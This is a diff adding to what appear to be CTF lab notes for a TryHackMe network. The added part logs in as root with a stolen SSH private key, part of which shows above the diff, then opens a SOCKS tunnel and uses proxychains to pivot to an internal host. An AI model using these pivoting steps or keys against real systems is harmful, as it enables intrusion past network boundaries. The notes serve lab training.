@@ -78,3 +78,45 @@ EsDTnTZceDBI6uBFoTQ1nIMnoyAxOSUC+Rb1TBBSwns/r4AJuA/d+cSp5U0jbfoR0R/8by
 GbJ7oAQ232an8AAAARcm9vdEB0bS1wcm9kLXNlcnYBAg==
 -----END OPENSSH PRIVATE KEY-----
 ```
+
+Let's login 1st:
+```
+ ssh -i id_rsa root@thomaswreath.thm
+```
+
+Let's establish the SOCKS:
+```
+ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm
+```
+
+This is what worked for me as i don't have a password
+```
+ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm -i id_rsa
+```
+
+
+What each flag does:
+
+| Flag | Explanation                                                                                                                                                          |
+| ---- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| `-f` | This sends the command to background right before executing a command remotely (think `command &`)                                                                   |
+| `-N` | This tells `ssh` not to execute a command remotely. We are just establishing a tunnel/proxy, no need to execute a command.                                           |
+| `-D` | This tells `ssh` to establish a local dynamic application-level port forwarding. This is the local port we will send our requests to IE where our SOCKS proxy exists |
+
+
+
+Once we have a SOCKS proxy established, we can then use `proxychains4` to communicate over the newly established tunnel/proxy. I make a local config file to use.
+
+```
+socks4  127.0.0.1 8888 # From our machine to jumpbox1 (i.e. Prod-Serv) via this command you ran: ssh -f -N -D 127.0.0.1:8888 root@thomaswreath.thm
+```
+
+
+```
+proxychains4 -f ~/new-proxychains.conf ssh jumpbox2.local
+```
+
+
+```
+
+```
